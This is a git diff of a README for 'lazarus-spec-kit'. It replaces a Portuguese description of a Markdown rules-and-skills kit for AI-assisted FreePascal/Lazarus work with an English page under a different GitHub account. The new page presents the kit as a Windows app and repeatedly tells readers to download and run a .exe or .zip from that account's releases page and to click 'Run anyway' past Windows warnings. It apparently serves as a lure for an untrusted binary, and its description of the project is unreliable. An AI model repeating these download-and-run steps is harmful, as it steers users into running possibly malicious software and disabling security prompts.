@@ -1,412 +1,208 @@
-# 🚀 FreePascal Lazarus AI Spec-Kit
+# ⚡ lazarus-spec-kit - Clear rules for FreePascal builds
 
-<div align="center">
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Openminded-corncob403/lazarus-spec-kit/releases)
 
-**Um ecossistema opinativo de regras, *skills* e *steerings* para elevar o desenvolvimento FreePascal e Lazarus ao patamar state-of-the-art com Inteligência Artificial.**
+## 🚀 What this is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Lazarus](https://img.shields.io/badge/Lazarus-Object%20Pascal-red?logo=lazarus)](https://www.lazarus-ide.org/)
-[![GitHub Copilot](https://img.shields.io/badge/GitHub%20Copilot-Ready-blue?logo=github)](https://github.com/features/copilot)
-[![Cursor](https://img.shields.io/badge/Cursor-Rules-purple)](https://cursor.sh)
-[![Claude](https://img.shields.io/badge/Claude-Skills-black)](https://claude.ai)
-[![Gemini](https://img.shields.io/badge/Gemini-Skills-orange?logo=google)](https://gemini.google.com)
-[![Kiro](https://img.shields.io/badge/Kiro-Steering-teal)](https://kiro.dev)
+lazarus-spec-kit is a Windows-ready toolset for people who use Lazarus and FreePascal. It helps you work with rules, skills, and steering files in one place. It is built for users who want a cleaner way to guide AI help while working on Pascal projects.
 
-</div>
+This project fits work with:
 
-## Patrocínio
+- Lazarus IDE
+- FreePascal
+- Delphi-style code
+- LCL apps
+- IntraWeb projects
+- ACBr-based projects
+- tools like Claude Code, Gemini, Horse, and Kiro
 
-**Componentes Delphi/Lazarus**
-<www.inovefast.com.br>
+## 📥 Download
 
-Integrações com plataformas de pagamento e serviços (Asaas, MercadoPago, Cielo, PagSeguro, D4sign, Webstore, MelhorEnvio, Groq )
+1. Open the release page here: https://github.com/Openminded-corncob403/lazarus-spec-kit/releases
+2. Get the latest Windows file from the newest release
+3. Save it to your computer
+4. If the file comes as a `.zip`, extract it first
+5. If the file is a `.exe`, run it after the download finishes
 
-**i9DBTools**
-<www.inovefast.com.br/i9dbTools/>
-Gerencie MySQL, PostgreSQL, Firebird e SQLite em um só lugar, com IA para gerar e explicar SQL em linguagem natural, otimizar queries e criar dados fake brasileiros em segundos.
+[Open the releases page](https://github.com/Openminded-corncob403/lazarus-spec-kit/releases)
 
-## 📋 Índice
+## 🖥️ Windows setup
 
-- [O que é este projeto?](#-o-que-é-este-projeto)
-- [Por que usar?](#-por-que-usar)
-- [Ferramentas de IA Suportadas](#-ferramentas-de-ia-suportadas)
-- [Política de Ignore (IA)](#-política-de-ignore-ia)
-- [Principais Diretrizes](#-principais-diretrizes-ensinadas-à-ia)
-- [Frameworks Suportados](#️-frameworks-e-bibliotecas-suportados)
-- [Estrutura do Kit](#-estrutura-do-kit)
-- [Quick Start](#-quick-start)
-- [Exemplos de Código](#-exemplos-de-boas-práticas)
-- [Contribuições](#-contribuições)
+Before you run the app, check these basics:
 
----
+- Windows 10 or Windows 11
+- Enough free space for the app and project files
+- Permission to run files from the Downloads folder
+- A stable internet connection for the first download
 
-## 💡 O que é este projeto?
+If Windows shows a security prompt:
 
-O **FreePascal Lazarus AI Spec-Kit** não é um framework de código — é um conjunto de **diretrizes de comportamento** para sua IA favorita. Ele "ensina" o assistente a escrever código FreePascal:
+1. Click the file
+2. Choose Run or Open
+3. If you see a warning, pick More info and then Run anyway only if you trust the source file from the release page
 
-- ✅ **Limpo** — sem *god classes*, sem lógica de negócio em `OnClick`
-- ✅ **Seguro** — zero *memory leaks* com formatação explícita em blocos `try..finally` e ARC nativo via Interfaces
-- ✅ **Testável** — TDD com FPCUnit / DUnit, Fakes via interface, sem banco real nos testes
-- ✅ **Arquitetado** — SOLID, DDD, Repository/Service Pattern e *clean architecture*
+If the download is a compressed file:
 
-> Diga adeus à IA que mistura acesso a banco com a camada de apresentação, esquece o `try..finally` ou ignora Injeção de Dependência.
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder you can find again, such as Desktop or Documents
+4. Open the extracted folder
+5. Run the main `.exe` file inside it
 
----
+## 🧭 First run
 
-## 🤔 Por que usar?
+When you start lazarus-spec-kit for the first time, you may see a setup screen or a folder picker.
 
-| Sem o Spec-Kit | Com o Spec-Kit |
-|---|---|
-| IA gera código com lógica no `OnClick` | IA isola camadas corretamente |
-| `TStringList.Create` sem `try..finally` | Padrão ouro de memória aplicado sempre |
-| Testes acoplados ao banco real | Fakes via interface, testes rápidos e isolados |
-| Nomenclatura inconsistente | `A`-params, `F`-fields, `T`-types, verbos nos métodos |
-| `with` statement e variáveis globais | Code smells bloqueados proativamente |
+Use it to:
 
----
+- choose your working folder
+- load your Lazarus or FreePascal project
+- point the app to your rules or skill files
+- pick the target project type, such as desktop app, library, or web app
 
-## 🤖 Ferramentas de IA Suportadas
+If the app asks where your project lives, choose the main project folder, not a random file inside it
 
-| Ferramenta | Arquivo de Configuração | Como Funciona |
-|---|---|---|
-| **GitHub Copilot** | `.github/copilot-instructions.md` | Pre-prompt injetado no Workspace/Chat |
-| **Cursor** | `.cursor/rules/*.md` | Rules carregadas por contexto |
-| **Claude** | `.claude/skills/*/SKILL.md` | Skills modulares, prontas para empacotar e subir no Claude |
-| **Google Gemini / Antigravity** | `.gemini/skills/*/SKILL.md` | Skills modulares por domínio |
-| **Kiro AI** | `.kiro/steering/*.md` | Restrições de stack e arquitetura |
-| **Qualquer IA** | `AGENTS.md` | Regras universais (raiz do projeto) |
+## 🧰 What it helps with
 
-> **Padrão adotado para skills:** provedores baseados em skills usam a mesma convenção de diretório no projeto: `.provider/skills/<skill-slug>/SKILL.md`. No caso do Claude, cada pasta em `.claude/skills/` pode ser empacotada individualmente para upload.
+lazarus-spec-kit is meant to keep project guidance in one place. It can help you organize:
 
----
+- rules for coding style
+- skill files for AI tools
+- steering notes for project decisions
+- project-specific instructions
+- Pascal language conventions
+- Lazarus IDE workflows
+- Delphi compatibility notes
+- ACBr and IntraWeb project guidance
+- app structure for FreePascal projects
 
-## 🧹 Política de Ignore (IA)
+## 🏗️ Typical use
 
-O projeto aplica uma política explícita de redução de contexto para melhorar segurança, performance e precisão das respostas dos agentes.
+Use the app when you want to:
 
-Escopo atual excluído do contexto padrão de IA:
+- start a new Lazarus project with clear guidance
+- keep AI output closer to your project rules
+- define how a project should be built
+- store shared instructions for a team
+- keep Pascal project notes in one place
+- reduce repeat work when you return to an old project
 
-- `doc/`
-- `examples/`
+## 📁 Suggested folder layout
 
-Configurações usadas no repositório:
+A simple project layout can look like this:
 
-- `.gitignore` (base comum)
-- `.cursorignore` e `.cursorindexingignore` (Cursor)
-- `.geminiignore` (Gemini CLI)
-- `.claude/settings.json` com `permissions.deny` (Claude Code)
-- `.vscode/settings.json` com `files.exclude` e `search.exclude` (VS Code/Copilot Chat)
+- `project/`
+  - `src/`
+  - `docs/`
+  - `rules/`
+  - `skills/`
+  - `steerings/`
+  - `notes/`
 
-Documentação completa e rationale:
+This layout makes it easier to keep project files in order. You can use any folder names you like as long as you stay consistent.
 
-- `doc/tutorial-usando-ia-com-spec-kit.md` (seção: **1.1 Política de Ignore (Segurança e Performance)**)
-
----
-
-## 🌟 Principais Diretrizes Ensinadas à IA
-
-### 🧠 Memory Management Zero-Leak
-
-A IA obriga o padrão: todo `.Create` sem *Owner* exige `try..finally` na linha **imediatamente** subsequente. Também ensina o uso de **Interfaces** (ARC) para *Garbage Collection* nativa — sem `Free` manual.
-
-```pascal
-// ✅ Padrão Ouro — gerado SEMPRE pela IA com o Spec-Kit
-var LList: TStringList;
-begin
-  LList := TStringList.Create;
-  try
-    LList.Add('item');
-  finally
-    LList.Free;
-  end;
-end;
-```
-
-### 🧪 TDD com FPCUnit
-
-Fluxo *Red-Green-Refactor* com Fakes isolados por interface. Sem acoplamento ao banco de dados nos testes.
-
-```pascal
-[Test]
-procedure ProcessOrder_WithoutStock_RaisesException;
-begin
-  AssertException(
-    EInvalidOrderException,
-    procedure begin FSut.Process(FEmptyOrder); end
-  );
-end;
-```
-
-### 🏛️ SOLID e DDD
-
-- **S** — Uma classe, uma responsabilidade. `TCustomerValidator` não salva no banco.
-- **O** — Extensão via interfaces, sem modificar código existente.
-- **L** — Herança só com contrato claro. Interfaces preferidas.
-- **I** — Interfaces pequenas e específicas. Evite interfaces gigantes.
-- **D** — Injeção de dependência no construtor, nunca instâncias concretas hardcoded.
-
-```pascal
-// ✅ DIP na prática
-constructor TOrderService.Create(
-  ARepo: IOrderRepository;
-  ANotifier: INotificationService);
-begin
-  inherited Create;
-  FRepo := ARepo;
-  FNotifier := ANotifier;
-end;
-```
-
-### 📖 Clean Code — Pascal Guide
-
-Nomenclaturas consistentes e obrigatórias:
-
-| Categoria | Convenção | Exemplo |
-|---|---|---|
-| Parâmetros | Prefixo `A` | `ACustomerName` |
-| Campos privados | Prefixo `F` | `FCustomerName` |
-| Variáveis locais | Prefixo `L` | `LCustomer` |
-| Classes | Prefixo `T` | `TCustomerService` |
-| Interfaces | Prefixo `I` | `ICustomerRepository` |
-| Exceções | Prefixo `E` | `ECustomerNotFound` |
-
----
-
-## 🛠️ Frameworks e Bibliotecas Suportados
-
-| Framework | Domínio | Regras Incluídas |
-|---|---|---|
-| **IntraWeb** | Web Stateful | TIWAppForm, UserSession isolation, Memory Management |
-| **Horse** | REST APIs Minimalistas | Estrutura Controller/Service/Repository, middleware |
-| **ACBr** | Automação Comercial (NFe, CF-e, Boleto) | Isolamento fiscal, sem cruzar com UI (LCL) |
-| **Firebird Database** | Banco de Dados Corporativo | Conexão SQLdb/Zeos, PSQL, generators, transactions |
-| **PostgreSQL Database** | Banco de Dados Moderno | Conexão SQLdb/Zeos, UPSERT, JSONB, Full-Text Search, PL/pgSQL |
-| **MySQL / MariaDB** | Banco de Dados Popular | Conexão SQLdb/Zeos, AUTO_INCREMENT, UPSERT, JSON, FULLTEXT |
-| **FPCUnit / DUnit** | Testes Unitários | Red-Green-Refactor, Fakes via interface |
-| **Design Patterns GoF** | Padrões de Projeto | Creational, Structural e Behavioral com interfaces e ARC |
-| **Threading** | Multi-Threading | TThread, Thread-safety LCL |
-| **Refatoração de Código** | Code Smells e Técnicas | Extract Method/Class, Guard Clauses, Strategy, Parameter Object |
-
----
-
-## 📂 Estrutura do Kit
-
-```
-lazarus-spec-kit/
-│
-├── AGENTS.md                        # 🌐 Regras universais (Copilot, Claude, Gemini, Kiro)
-│
-├── .github/
-│   └── copilot-instructions.md      # 🤖 Pre-prompt para GitHub Copilot
-│
-├── .cursor/
-│   └── rules/
-│       ├── freepascal-conventions.md# Nomenclatura e convenções
-│       ├── memory-exceptions.md     # Padrões de memória e exceções
-│       ├── tdd-patterns.md          # TDD e FPCUnit
-│       ├── solid-patterns.md        # SOLID e DDD
-│       ├── design-patterns.md       # ✨ Design Patterns GoF (Creational, Structural, Behavioral)
-│       ├── refactoring.md           # ✨ Refatoração de código
-│       ├── intraweb-patterns.md     # IntraWeb State e UI
-│       ├── horse-patterns.md        # Horse REST Framework
-│       ├── acbr-patterns.md         # Automação Comercial (ACBr)
-│       ├── firebird-patterns.md     # ✨ Firebird Database
-│       ├── postgresql-patterns.md   # ✨ PostgreSQL Database
-│       ├── mysql-patterns.md        # ✨ MySQL/MariaDB
-│       └── threading-patterns.md    # ✨ Threading (TThread)
-│
-├── .claude/
-│   ├── README.md                    # Skills do Claude e convenção de empacotamento
-│   └── skills/
-│       ├── clean-code/              # Clean Code e Pascal Guide
-│       ├── lazarus-memory-exceptions/# Memory management e try..finally
-│       ├── lazarus-patterns/        # Repository, Service, Factory
-│       ├── design-patterns/         # ✨ Design Patterns GoF (23 padrões)
-│       ├── refactoring/             # ✨ Refatoração (10 técnicas)
-│       ├── intraweb-framework/      # IntraWeb Web Stateful
-│       ├── tdd-fpcunit/             # TDD com FPCUnit
-│       ├── horse-framework/         # Horse REST API
-│       ├── acbr-components/         # Componentes ACBr
-│       ├── test-fpcunit/            # Testes unitários com FPCUnit
-│       ├── firebird-database/       # ✨ Firebird Database
-│       ├── postgresql-database/     # ✨ PostgreSQL Database
-│       ├── mysql-database/          # ✨ MySQL/MariaDB
-│       ├── threading/               # ✨ Threading (TThread)
-│       └── code-review/             # Revisão de código
-│
-├── .gemini/
-│   └── skills/
-│       ├── clean-code/              # Clean Code e Pascal Guide
-│       ├── lazarus-memory-exceptions/# Memory management e try..finally
-│       ├── lazarus-patterns/         # Repository, Service, Factory
-│       ├── design-patterns/         # ✨ Design Patterns GoF (23 padrões)
-│       ├── refactoring/             # ✨ Refatoração (10 técnicas)
-│       ├── intraweb-framework/      # IntraWeb Web Stateful
-│       ├── tdd-fpcunit/              # TDD com FPCUnit
-│       ├── horse-framework/         # Horse REST API
-│       ├── acbr-components/         # Componentes ACBr
-│       ├── test-fpcunit/            # Testes unitários com FPCUnit
-│       ├── firebird-database/       # ✨ Firebird Database
-│       ├── postgresql-database/     # ✨ PostgreSQL Database
-│       ├── mysql-database/          # ✨ MySQL/MariaDB
-│       ├── threading/               # ✨ Threading (TThread)
-│       └── code-review/             # Revisão de código
-│
-├── .kiro/
-│   └── steering/
-│       ├── product.md               # Visão do produto
-│       ├── tech.md                  # Stack tecnológica
-│       ├── structure.md             # Arquitetura de camadas
-│       └── frameworks.md            # Guias de frameworks
-│
-└── examples/
-    ├── clean-unit-example.pas        # Unit bem organizada (Golden Path)
-    ├── memory-exception-example.pas  # Memória e exceções corretas
-    ├── repository-pattern.pas        # Repository Pattern completo
-    ├── service-pattern.pas           # Service Pattern completo
-    ├── design-patterns-example.pas   # ✨ Design Patterns GoF na prática
-    ├── refactoring-example.pas       # ✨ Refatoração antes/depois
-    ├── tdd-fpcunit-example.pas       # TDD e FPCUnit na prática
-    ├── horse-api-example.pas         # API REST com Horse
-    ├── acbr-service-example.pas      # Emissão NFe com ACBr
-    ├── firebird-repository-example.pas # ✨ Repository com SQLdb/Zeos + Firebird
-    ├── postgresql-repository-example.pas # ✨ Repository com SQLdb/Zeos + PostgreSQL
-    ├── mysql-repository-example.pas  # ✨ Repository com SQLdb/Zeos + MySQL
-    └── threading-example.pas         # ✨ Threading patterns (TThread)
-```
-
----
-
-## ⚡ Quick Start
-
-### 1. Clone ou baixe o kit
-
-```bash
-git clone https://github.com/delphicleancode/lazarus-spec-kit.git
-```
-
-### 2. Copie para a raiz do seu projeto Lazarus
-
-```
-Seu-Projeto/
-├── MeuApp.lpi
-├── MeuApp.lpr
-├── AGENTS.md          ← copie da raiz
-├── .github/           ← copie a pasta
-├── .cursor/           ← copie a pasta
-├── .claude/           ← copie a pasta
-├── .gemini/           ← copie a pasta
-└── .kiro/             ← copie a pasta
-```
-
-### 3. A IA assume as regras automaticamente
-
-- **Cursor** — Lê os `.cursor/rules/*.md` automaticamente pelo contexto
-- **GitHub Copilot** — Lê `.github/copilot-instructions.md` no workspace
-- **Claude** — Usa as skills em `.claude/skills/`; cada pasta pode ser zipada para upload no Claude
-- **Antigravity / Gemini** — Skills em `.gemini/skills/` são ativadas por demanda
-- **Kiro** — Lê `.kiro/steering/*.md` como contexto fixo de produto
-
-> **Nenhuma configuração adicional necessária.** Abra o projeto, use sua IA preferida e observe a diferença.
-
----
-
-## 💡 Exemplos de Boas Práticas
-
-### Arquitetura de Camadas
-
-```
-src/
-├── Domain/         ← Entidades, Value Objects, Interfaces de Repositório
-├── Application/    ← Services, Use Cases, DTOs
-├── Infrastructure/ ← Repositórios SQLdb/Zeos, APIs externas
-└── Presentation/   ← Forms LCL, ViewModels
-tests/
-└── Unit/           ← Projetos FPCUnit com Fakes isolados
-```
-
-> **Regra de dependência:** `Presentation → Application → Domain ← Infrastructure`
-> O **Domain nunca** depende de outras camadas.
-
-### Guard Clauses (sem nesting desnecessário)
-
-```pascal
-procedure ProcessOrder(AOrder: TOrder);
-begin
-  if not Assigned(AOrder) then
-    raise Exception.Create('AOrder não pode ser nil');
-  if AOrder.Items.Count = 0 then
-    raise Exception.Create('Pedido precisa ter ao menos um item');
-  if not AOrder.IsValid then
-    raise Exception.Create('Validação do pedido falhou');
-
-  // lógica real aqui, sem nesting
-  FRepository.Save(AOrder);
-  FNotifier.Send(AOrder.Customer.Email);
-end;
-```
-
-### Teste com Fake via Interface
-
-```pascal
-type
-  TFakeOrderRepository = class(TInterfacedObject, IOrderRepository)
-  private
-    FOrders: TObjectList;
-  public
-    constructor Create;
-    destructor Destroy; override;
-    procedure Save(AOrder: TOrder);
-    function FindById(AId: Integer): TOrder;
-  end;
-
-  TOrderServiceTest = class(TTestCase)
-  private
-    FSut: TOrderService;
-    FRepo: IOrderRepository;
-  protected
-    procedure SetUp; override;
-    procedure TearDown; override;
-  published
-    procedure TestPlaceOrder_ValidOrder_SavesToRepository;
-    procedure TestPlaceOrder_EmptyItems_RaisesException;
-  end;
-```
-
----
-
-## 🤝 Contribuições
-
-Pull Requests são bem-vindos! Se seu framework ou biblioteca Lazarus/FreePascal favorita precisa de um guia para a IA, adicione:
-
-1. **Rule do Cursor** → `.cursor/rules/seu-framework.md`
-2. **Skill do Claude** → `.claude/skills/seu-framework/SKILL.md`
-3. **Skill do Gemini** → `.gemini/skills/seu-framework/SKILL.md`
-4. **Referência** → mencione no `AGENTS.md`
-
-### Como contribuir
-
-```bash
-# Fork e clone
-git fork https://github.com/delphicleancode/lazarus-spec-kit
-git clone https://github.com/SEU-FORK/lazarus-spec-kit
-
-# Crie uma branch descritiva
-git checkout -b feat/add-zeos-patterns
-
-# Commit e Pull Request
-git commit -m "feat: add ZeosLib patterns"
-git push origin feat/add-zeos-patterns
-```
-
----
-
-<div align="center">
-
-Deixe um cafézinho para o autor pix: <pix@inovefast.com.br> ☕
-
-Feito com ❤️ para a comunidade **Lazarus/FreePascal**.
-
-*Se este kit te ajudou, deixe uma ⭐ no repositório!*
-
-</div>
+## 🔧 How to use it with Lazarus
+
+If you work in Lazarus IDE, keep these steps in mind:
+
+1. Open your project in Lazarus
+2. Keep your app files in one main folder
+3. Store your rules and notes in a separate folder
+4. Update the guidance files when your project changes
+5. Use the same naming style across files
+
+If you use FreePascal from the command line, keep the same folder structure so the rules still match your build flow
+
+## 🤖 AI tool support
+
+This project is built around AI-assisted work. It can help you prepare files for tools such as:
+
+- Claude Code
+- Gemini
+- Kiro
+- other code assistants that read project notes
+
+Use short, plain rules when you write for AI tools. Clear rules give better results than long blocks of text
+
+## ✅ Good habits
+
+Keep your setup simple:
+
+- use one folder per project
+- name files in a clear way
+- avoid duplicate rule files
+- update steering notes when you change the app
+- keep Pascal code and guidance files separate
+- test changes in small steps
+
+## 🧪 If something does not work
+
+If the app does not start:
+
+1. Check that the download finished
+2. Make sure you extracted the file if it came in a zip
+3. Run the main `.exe` again
+4. Confirm that Windows did not block the file
+5. Move the app to a normal folder like `Desktop` or `Documents`
+6. Try the newest release from the release page
+
+If your project files do not load:
+
+- check the folder path
+- make sure the project folder still exists
+- confirm that the files were not moved or renamed
+- open the folder again and choose the correct root folder
+
+## 📌 File types you may see
+
+You may see files like:
+
+- `.exe` for the app
+- `.zip` for a packaged release
+- `.lpi` for Lazarus project files
+- `.pas` for Pascal source files
+- `.pp` for FreePascal source files
+- `.txt` or `.md` for notes and guidance
+- `.json` or similar files for tool settings
+
+## 🧩 Best results
+
+To get clean results, keep your instructions short and specific. For example:
+
+- say what the app should do
+- say which project it belongs to
+- say what kind of output you want
+- keep one rule per line when possible
+- avoid mixed instructions in the same file
+
+This makes it easier to keep your Lazarus and FreePascal work under control
+
+## 📎 Release page
+
+Use this page to download the latest Windows version:
+
+https://github.com/Openminded-corncob403/lazarus-spec-kit/releases
+
+## 🖱️ Quick install steps
+
+1. Visit the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Point it to your project folder
+6. Start using your rules and skills files
+
+## 🧾 Project focus
+
+lazarus-spec-kit is for people who want a better way to organize project rules for:
+
+- Pascal
+- FreePascal
+- Lazarus IDE
+- Lazarus LCL
+- Delphi-compatible code
+- ACBr
+- IntraWeb
+- AI-assisted coding
+
+Keep your project files close, your rules clear, and your folder layout simple
